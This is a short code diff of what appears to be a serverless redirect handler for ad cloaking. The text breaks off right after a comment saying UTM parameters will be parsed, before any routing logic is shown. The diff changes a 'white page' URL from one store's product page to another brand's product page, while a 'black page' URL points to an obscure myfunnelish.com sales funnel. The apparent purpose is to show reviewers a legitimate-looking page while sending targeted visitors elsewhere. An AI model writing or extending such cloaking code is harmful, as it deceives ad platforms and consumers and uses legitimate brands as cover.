@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://cheekywinx.com/products/pearl-thermal-water-bottle-950ml-free-silicone-bumper";
+    const whitePageURL = "https://atoms.com/products/atoms-model-001-black-white";
     const blackPageURL = "https://dnfiwbzxjq.myfunnelish.com/imbassd-1736979042571105-1737834191248667";
   
     // Parse the UTM parameters from the request URL
